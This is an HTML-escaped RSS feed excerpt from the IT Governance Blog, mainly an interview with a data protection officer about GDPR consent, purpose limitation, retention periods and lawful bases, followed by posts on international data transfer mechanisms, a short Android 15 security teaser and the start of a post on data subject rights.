When I asked data privacy trainer and DPO (data protection officer) Andy Snow which principle organisations are most prone to getting wrong, he found it hard to pick just one. In part, this is due to how the principles naturally interlink – an issue with one principle naturally leads to issues with (some of) the others, too. Andy took the first principle as an example, saying: You’d think organisations can get something as basic &lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/how-organisations-are-failing-to-process-personal-data-lawfully-under-the-gdpr"&gt;How Organisations Are Failing to Process Personal Data Lawfully Under the GDPR&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;Problems with consent, purpose limitation, retention periods, and more&lt;/h2&gt;



&lt;p&gt;&lt;em&gt;At the heart of the &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;GDPR (General Data Protection Regulation)&lt;/em&gt;&lt;/a&gt;&lt;em&gt; lie the Article 5 data protection principles.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;When I asked &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/gdpr-training" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;data privacy trainer&lt;/em&gt;&lt;/a&gt;&lt;em&gt; and &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-officer-dpo-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;DPO (data protection officer)&lt;/em&gt;&lt;/a&gt;&lt;em&gt; Andy Snow which principle organisations are most prone to getting wrong, he found it hard to pick just one. In part, this is due to how the principles naturally interlink – an issue with one principle naturally leads to issues with (some of) the others, too.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;Andy took the first principle as an example, saying:&lt;/em&gt;&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;You’d think organisations can get something as basic as ‘lawfulness, fairness and transparency’ right, but no!&lt;/p&gt;



&lt;p&gt;There are often problems with the lawfulness of personal data processing, largely due to over-reliance on consent. Organisations still don’t understand what consent &lt;em&gt;actually&lt;/em&gt; entails.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;&lt;em&gt;I sat down with Andy to find out more. How are organisations failing to process personal data lawfully under the GDPR, and how can they address this while improving their day-to-day business operations?&lt;/em&gt;&lt;/p&gt;

&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;You say organisations misunderstand consent under the GDPR. Could you elaborate?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Suppose you have an organisation processing a million people’s data for &lt;a href="https://www.itgovernance.co.uk/green-papers/gdpr-and-pecr-a-guide-for-marketers" rel="noreferrer noopener" target="_blank"&gt;marketing&lt;/a&gt; purposes based on consent. &lt;a href="https://www.itgovernance.co.uk/blog/how-you-can-demonstrate-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;Accountability&lt;/a&gt; says you must be able to &lt;em&gt;demonstrate&lt;/em&gt; that consent – but organisations frequently can’t.&lt;/p&gt;



&lt;p&gt;And then we face the next problem. Out of that million people, when was the last time someone purchased something? Or even &lt;em&gt;engaged&lt;/em&gt; with the marketing: &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Within the last month?&lt;/li&gt;



&lt;li&gt;Within the last three months?&lt;/li&gt;



&lt;li&gt;Within the last six months?&lt;/li&gt;



&lt;li&gt;Within the last year?&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Few organisations can give me that breakdown.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Stay ahead of the curve with expert insights on data privacy.&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p class="has-text-align-center"&gt;&lt;em&gt;To get notified of future&lt;/em&gt;&lt;em&gt; &lt;/em&gt;&lt;em&gt;Q&amp;amp;As and other free resources like this, subscribe to&lt;/em&gt;&amp;nbsp;&lt;br /&gt;&lt;em&gt;our free weekly newsletter&lt;/em&gt;&lt;em&gt;,&lt;/em&gt;&lt;em&gt; the &lt;/em&gt;&lt;strong&gt;&lt;em&gt;Security Spotlight&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;.&lt;/em&gt;&lt;em&gt;&lt;/em&gt;&amp;nbsp;&lt;/p&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-16018d1d wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link has-white-color has-luminous-vivid-orange-background-color has-text-color has-background has-link-color wp-element-button" href="https://www.itgovernance.co.uk/security-spotlight-newsletter" rel="noreferrer noopener" target="_blank"&gt;Subscribe now &lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Business-benefits-of-GDPR-compliance"&gt;Business benefits of GDPR compliance&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Putting consent aside for a moment [we come back to it &lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Consent"&gt;later&lt;/a&gt;], collecting that much data you’re not using seems counterproductive from a business point of view too.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Absolutely! Suppose the head of marketing reported to the board that the organisation is marketing to a million people. That &lt;em&gt;sounds&lt;/em&gt; good – except that figure is incredibly misleading if only a tiny percentage engages with that marketing.&lt;/p&gt;



&lt;p&gt;Sure, collecting more information &lt;em&gt;technically&lt;/em&gt; means more business opportunity. But it also means more risk: if you suffer a &lt;a href="https://www.itgovernance.co.uk/blog/how-long-do-you-have-to-report-a-data-breach" rel="noreferrer noopener" target="_blank"&gt;data breach&lt;/a&gt;, the impact will be far greater.&lt;/p&gt;



&lt;p&gt;More data also means more storage space, which tends to go hand in hand with a larger attack surface. In other words, it’s not just the potential impact that’s greater – you’re more likely to suffer a breach to begin with.&lt;/p&gt;



&lt;p&gt;Not to mention how storage space costs money, both for &lt;a href="https://www.itgovernance.co.uk/blog/7-ways-to-avoid-physical-security-threats-in-the-workplace" rel="noreferrer noopener" target="_blank"&gt;hard-copy&lt;/a&gt; and digital information. That cost can grow exponentially when also accounting for backups.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Purpose-limitation"&gt;Purpose limitation&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;What’s a clue that an organisation is processing too much personal data?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;When you can’t point to a clear reason for storing or processing that personal data. [Principle 2 – purpose limitation.]&lt;/p&gt;



&lt;p&gt;If you can’t point to one, that’s not just unlawful – it strongly signals that keeping the data serves no &lt;em&gt;business&lt;/em&gt; purpose either.&lt;/p&gt;



&lt;p&gt;This is what I like about the GDPR – if you adhere to its principles, you’re not just protecting people’s data, but also running your business better.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Can you give us a real-life example?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Visitor logs are a good one. What do you keep them for? What purpose do they serve?&lt;/p&gt;



&lt;p&gt;Well, they’re generally used to account for who is within the building on a given day – in case of having to do a headcount if you had to evacuate the building, for example.&lt;/p&gt;



&lt;p&gt;So, why would you need to keep those logs for any longer than that day? [Which many organisations do.]&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Shouldn’t you keep visitor logs for the same time you keep &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/does-your-use-of-cctv-comply-with-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;CCTV&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; footage?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;Exactly&lt;/em&gt;. A couple of years back, I was on-site with a client. They had me sign a visitor’s book. They also took my picture.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Me: “Why do you need my picture?”&lt;/li&gt;



&lt;li&gt;Client: “If we identify suspicious activity on CCTV, we can use those pictures to identify the person.”&lt;/li&gt;



&lt;li&gt;M: “Excellent! So, how long do you keep your CCTV footage for?”&lt;/li&gt;



&lt;li&gt;C: “We store it on a rolling 30-day cycle.”&lt;/li&gt;



&lt;li&gt;M: “Fantastic. How long do you keep visitor pictures for?”&lt;/li&gt;



&lt;li&gt;C: “We’ve got them going back to 2009.”&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;That stayed with me as the perfect example of people not understanding why they’re collecting data, how they’re using that data, or how long they should be keeping it for.&lt;/p&gt;



&lt;p&gt;That said, this is just &lt;em&gt;one&lt;/em&gt; reason for collecting this information. In specific scenarios, you may have to keep it for extended periods.&lt;/p&gt;



&lt;p&gt;A good example might be that an incident had taken place, so you need to keep the footage and pictures from a specific period for longer – the duration of the investigation and possible court case.&lt;/p&gt;



&lt;p&gt;Your retention periods can allow for leeway to your usual periods for these types of scenarios – you can set out the &lt;em&gt;criteria&lt;/em&gt; for setting your retention periods as well as concrete time periods.&lt;/p&gt;



&lt;p&gt;Either way, it comes back to data minimisation and purpose limitation: only collect personal data for a specific purpose, and keep it only for as long as necessary for that purpose.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Retention-periods"&gt;Retention periods&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Let’s come back to your earlier marketing example: an organisation has a massive marketing mailing list but only a fraction of people on it interact with that marketing.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Where do we go from there?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Your &lt;a href="https://www.itgovernance.co.uk/blog/top-tips-for-data-retention-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;retention schedule&lt;/a&gt; should make clear when you’re archiving those records [assuming you don’t use them for other purposes] after some reasonable period. That might be six months, or perhaps a year.&lt;/p&gt;



&lt;p&gt;At a minimum, your retention schedule should set out the &lt;em&gt;criteria&lt;/em&gt; for setting the retention periods. [Also see the earlier explanation.]&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What does ‘archiving’ mean in this context? And how long should it remain in the archive before the data is permanently deleted or destroyed?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If someone ends up on a marketing list, you may have already been processing their data for a different reason – most obviously, because they purchased something.&lt;/p&gt;



&lt;p&gt;So, suppose that person opted out of marketing. You’d then no longer actively process their data, but you’d need to store their records to meet your legal and/or contractual obligations. That’s a form of archiving – storing personal data and safeguarding it with encryption, or another appropriate measure, but not doing anything else with that data.&lt;/p&gt;



&lt;p&gt;You’d then destroy it once the retention period for that legal or contractual obligation runs out.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Can data be truly destroyed?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Most organisations will simply click ‘delete’, and not do additional storage media sanitisation, like overwriting it at least seven times to sanitise the storage media, or use a software solution that ‘shreds’ the data electronically.&lt;/p&gt;



&lt;p&gt;But the GDPR is risk-based, and in many circumstances, such state-of-the-art measures wouldn’t be proportionate. So, someone just presses ‘delete’, then the data should be gone – including from backups – within a month of that deletion.&lt;/p&gt;



&lt;p&gt;The key is to make the personal data unidentifiable, using the tools reasonably available. After all, it’s a criminal offence to attempt to re-identify de-identified data!&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Coming back to retention periods, how can an organisation establish a “reasonable” retention period?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Organisations must ask themselves: when do we say ‘enough is enough’? Where do we draw that line in the sand and stop contacting this person? When does it become clear that they’re not going to respond, and we’re wasting time and resources by trying to contact them again?&lt;/p&gt;



&lt;p&gt;The exact moment depends on the organisation. What type of product or service are you trying to sell? If you’re a luxury retailer, or selling high-ticket items like fridge freezers, your expectations are different to an organisation that sells, say, monthly subscriptions.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What other problems do you see around data retention?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;One classic scenario is what you do with the data of someone who leaves an organisation. You’ll then archive the record – but what part of that record?&lt;/p&gt;



&lt;p&gt;The trouble is that organisations treat personal data as a ‘bundle’, rather than look at the individual categories of data.&lt;/p&gt;



&lt;p&gt;For example, unless you had to use the person’s emergency contact details while they were employed, you can likely destroy that part of their record immediately after they leave. You no longer have a reason to keep that data.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Lawful-bases"&gt;Lawful bases&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;We’ve touched on the reasons for, or purposes of, processing a few times now. Of course, these link closely to the &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;lawful bases&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;. The basic GDPR rules around them seem reasonably straightforward: you need to be able to rely on one of the six lawful bases to process personal data lawfully.&lt;/strong&gt;&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-47017" height="454" src="https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/11/image-2.png" width="938" /&gt;&lt;/figure&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;So, where do problems arise?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;People don’t understand that the lawful bases are &lt;em&gt;not&lt;/em&gt; an open-ended ticket – they need &lt;em&gt;time limits&lt;/em&gt;. They need &lt;em&gt;relevance&lt;/em&gt; [i.e. purpose limitation].&lt;/p&gt;



&lt;p&gt;You need to know what your legal and contractual requirements are for data processing and retention. Beyond that, you need to understand what &lt;em&gt;you&lt;/em&gt; need the data for.&lt;/p&gt;



&lt;p&gt;Let’s take a basic example: an employment contract.&lt;/p&gt;



&lt;p&gt;When you employ someone, the contract will say you’re processing personal data to fulfil your contractual obligations. Upon termination of that contract, the lawful basis changes. At that point, you’re keeping the personal data for six years to meet a legal obligation.&lt;/p&gt;



&lt;p&gt;Some organisations might extend that to seven years, but that means you have to change the lawful basis again at the end of the sixth year: to legitimate interests. And you’ll have to show you can justify that legitimate interest through your LIA [legitimate interests assessment].&lt;/p&gt;



&lt;p&gt;Again, understand the lawful basis you’re relying on and its limitations. Whatever the purpose for processing, it needs to come with a life span appropriate to that purpose.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Consent"&gt;Consent&lt;/h2&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-47016" height="423" src="https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/11/image-1.png" width="938" /&gt;&lt;/figure&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Speaking of lawful bases, let’s come back to consent.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;The ‘typical’ requirements of consent aside [see above], must consent also be refreshed? And is there a link with appropriate retention periods, when processing personal data for marketing purposes?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Refreshing consent isn’t an explicit GDPR requirement – you either have consent or you don’t. The ICO was clear about that in the early days of the GDPR, and said something similar about the &lt;a href="https://www.itgovernance.co.uk/the-pecr-and-eu-eprivacy-directive" rel="noreferrer noopener" target="_blank"&gt;PECR&lt;/a&gt; [Privacy and Electronic Communications Regulations 2003].&lt;/p&gt;



&lt;p&gt;This includes the time-limit aspect. Once your retention period is hit, you no longer have consent – it’s not a grey area. You must then either archive that data or get new consent.&lt;/p&gt;



&lt;p&gt;That means asking the person if they want to receive marketing on XYZ – remember, consent must be clear, informed and given for a specific purpose to be valid.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What happens if one person in an organisation withdraws consent for marketing? Would you then be able to market to others within that same organisation?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Yes – the consent is for that individual, not for the overall organisation.&lt;/p&gt;



&lt;p&gt;Equally, if you’re about to approach a new person in that organisation, and someone else has already objected to marketing, you can still ask this other person for their consent.&lt;/p&gt;



&lt;p&gt;That said, be aware of the CTPS and FPS [Corporate Telephone Preference Service and Fax Preference Service]. These are central UK registers for businesses to opt out of unsolicited marketing phone calls and faxes, and apply to all employees within the businesses listed.&lt;/p&gt;



&lt;p&gt;So, before you make cold calls [or send cold faxes], check those registers.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What else must marketers be aware of around consent and the GDPR?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If you buy a marketing list, and email the people on that list, people may opt out of marketing from your organisation.&lt;/p&gt;



&lt;p&gt;Suppose that, a few weeks or months later, you then buy a new marketing list that has some duplicate email addresses with the first list. Make sure you don’t email those people again by putting them on a suppression list.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Lawful-processing:-not-breaking-other-laws"&gt;Lawful processing: not breaking other laws&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;We’ve talked a lot about the lawful bases under the GDPR. What about the other sense of ‘lawful’ processing [under the first data protection principle] – not breaking any other laws?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The EU GDPR was designed to integrate with EU laws, so you won’t get conflicts there. And although the UK has now left the EU, we haven’t seen too many differences between UK and EU law post-Brexit – at least, as far as data privacy and data processing go.&lt;/p&gt;



&lt;p&gt;But the further afield you go, the more problems you might run into – I gave an example of that in &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr#Mechanism-3" rel="noreferrer noopener" target="_blank"&gt;my blog&lt;/a&gt; about international transfers. [A large Saudi Arabian organisation is prevented by national law to report data breaches outside Saudi Arabia.]&lt;/p&gt;



&lt;p&gt;In a nutshell, the stricter requirement will always apply. That’s typically been the GDPR, particularly within Europe. However, we may see more divergence as the Regulation ages, and more new laws with stricter requirements than the GDPR emerge.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;p&gt;Consequently, you must put an appropriate mechanism or safeguard in place to &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;transfer personal data internationally&lt;/a&gt;, such as:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The IDTA (international data transfer agreement);&lt;/li&gt;



&lt;li&gt;SCCs (standard contractual clauses); or&lt;/li&gt;



&lt;li&gt;BCRs (binding corporate rules).&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Let’s take a closer look at these mechanisms, and when and how to use them.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this blog&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#What-are-SCCs-and-the-IDTA"&gt;What are SCCs and the IDTA?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#When-and-how-do-I-use-SCCs-the-IDTA"&gt;When and how do I use SCCs/the IDTA?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#What-are-BCRs"&gt;What are BCRs?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#When-should-I-implement-BCRs"&gt;When should I implement BCRs?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#How-can-we-use-BCRs"&gt;How can we use BCRs?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="What-are-SCCs-and-the-IDTA"&gt;What are SCCs and the IDTA?&lt;/h2&gt;



&lt;p&gt;Article 46(2)(c) of the EU GDPR allows for “standard data protection clauses adopted by the [European] Commission”. These are your ‘SCCs’ or ‘standard contractual clauses’.&lt;/p&gt;



&lt;p&gt;Post-Brexit, the UK introduced its own version of these model contractual clauses: the ‘IDTA’ or ‘international data transfer agreement’, but the same principles apply to both.&lt;/p&gt;



&lt;p&gt;Organisations can use these model contractual clauses to comply with their Article 28 requirements around &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-28-contracts-what-you-need-to-know" rel="noreferrer noopener" target="_blank"&gt;processor contracts&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;But they’re also a safeguard for international transfers if used correctly. Here are some points to consider:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Select the correct model clauses – the clauses are different for data controllers vs processors, and differ depending on the countries you’re sending data to.&lt;/li&gt;



&lt;li&gt;You can’t amend or remove the mandatory clauses of the IDTA/SCCs, but can amend their commercial terms, provided that they don’t change the meaning of the pre-written clauses. If you want to modify other aspects of the agreement, you’ll need to create a new contract.&lt;/li&gt;



&lt;li&gt;The clauses only apply to the data processing activities set out in the SCCs/IDTA. So, you must draft new contracts every time the activities change.&lt;/li&gt;



&lt;li&gt;You must complete a risk assessment, which will tell you whether you can proceed with the international data transfer. These are called:&lt;ul&gt;&lt;li&gt;IDTA: the TRA (transfer risk assessment).&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;SCCs: the TIA (transfer impact assessment).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Bear in mind that both the IDTA and SCCs are legal contracts. As such, we urge organisations to &lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-contract-and-legal-services" rel="noreferrer noopener" target="_blank"&gt;consult a data protection lawyer&lt;/a&gt; when creating them – because oversights in their terms or clauses could cause major problems.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="When-and-how-do-I-use-SCCs-the-IDTA"&gt;When and how do I use SCCs/the IDTA?&lt;/h2&gt;



&lt;p&gt;SCCs and the IDTA work well:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;For organisations likely to participate in two-way data sharing; and&lt;/li&gt;



&lt;li&gt;In internal personal data transfers where the processing is straightforward.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;However, in most cases, if the country you want to send personal data to has an adequacy decision, it makes more sense to rely on that.&lt;/p&gt;



&lt;p&gt;You also wouldn’t use SCCs or the IDTA if you’re an international organisation with an ongoing and/or complicated set of internal personal data transfers to undertake. This could quickly tie you up with &lt;em&gt;hundreds&lt;/em&gt; of SCCs to cover each pairing of entities, and each of your processing activities.&lt;/p&gt;



&lt;p&gt;In such a scenario, BCRs are usually more suitable.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="What-are-BCRs"&gt;What are BCRs?&lt;/h2&gt;



&lt;p&gt;BCRs are a set of internal rules (a bit like a code of conduct) that regulate international personal data transfers within a single multinational.&lt;/p&gt;



&lt;p&gt;They also act as a public acknowledgement of the privacy rights of individuals whose data is being processed. This can improve the organisation’s reputation among potential data subjects and other stakeholders.&lt;/p&gt;



&lt;p&gt;BCRs can be cumbersome to implement, because they cover a much larger and more complex set of processing activities than SCCs. That said, you just need &lt;em&gt;one&lt;/em&gt; set of rules, so long as:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;These are properly integrated into all data privacy laws you may need to comply with, including the UK and EU GDPR; and&lt;/li&gt;



&lt;li&gt;You have the correct supporting documents to go with them, like:&lt;ul&gt;&lt;li&gt;A list of covered entities;&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Data privacy policies and procedures;&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Data protection audit plans; and&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Guidelines for employees.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;








&lt;p&gt;This can make BCRs particularly suitable for large organisations that operate in many different countries or territories.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="When-should-I-implement-BCRs"&gt;When should I implement BCRs?&lt;/h2&gt;



&lt;p&gt;BCRs can apply to both controller and processor agreements/processing activities (of that single organisation).&lt;/p&gt;



&lt;p&gt;And once implemented and approved by the supervisory authority (which we’ll get to &lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#How-can-we-use-BCRs"&gt;below&lt;/a&gt;), BCRs have advantages like:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Making data protection an integral part of your organisation’s processes;&lt;/li&gt;



&lt;li&gt;Reducing compliance costs when you make changes to your processing activities; and&lt;/li&gt;



&lt;li&gt;Providing flexibility when you introduce new products or services (which usually changes your processing activities).&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="How-can-we-use-BCRs"&gt;How can we use BCRs?&lt;/h2&gt;



&lt;p&gt;The UK ICO (Information Commissioner’s Office) and European Commission regulate the use of the UK and EU BCRs respectively.&lt;/p&gt;



&lt;p&gt;Organisations that want to use EU BCRs must apply to a relevant supervisory authority to have their rules approved. The organisation must also designate a lead authority, who:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Advises other affected authorities, such as those in all EU member states where the organisation has offices; and&lt;/li&gt;



&lt;li&gt;Facilitates the authorisation process with other applicable data protection authorities.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;To use the UK BCRs, organisations must apply to the ICO. The regulator’s &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/guide-to-binding-corporate-rules/a-uk-bcr-addendum/" rel="noreferrer noopener" target="_blank"&gt;website&lt;/a&gt; has more information on the application process.&lt;/p&gt;



&lt;p&gt;BCRs can take 12 months or more to complete and, without legal assistance, can become onerous and extremely time-consuming.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Let GRCI Law help&lt;/h2&gt;

&lt;li&gt;Managing BCR registrations with supervisory authorities.&lt;/li&gt;

&lt;p&gt;In Android 15, some of the most notable involve making your device less appealing to snoops and thieves and more secure against the kids to whom you hand your phone to keep them quiet at dinner. There are also smart fixes for screen sharing, OTP codes, and cellular hacking prevention, but details about them are spread across Google's own docs and blogs and various news site's reports.&lt;/p&gt;
&lt;p&gt;Here's what is notable and new in how Android 15 handles privacy and security.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2024/10/android-15s-security-and-privacy-features-are-the-updates-highlight/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Organisations must let individuals know how they can exercise these rights, and meet requests promptly. Failure to do so is a violation of the GDPR and could lead to disciplinary action. But first, what is a data subject?&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/what-are-the-data-subject-rights-under-the-gdpr"&gt;GDPR: Data Subject Rights and Organisations’ Responsibilities&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Both the&amp;nbsp;UK and EU &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;GDPR (General Data Protection Regulation)&lt;/a&gt;&amp;nbsp;grant data subjects certain rights over their data, which, if exercised, data controllers must facilitate.&lt;/p&gt;



&lt;p&gt;Along with the data protection principles, the data subject rights – outlined in Articles 12–22 – are fundamental to the Regulation.&lt;/p&gt;



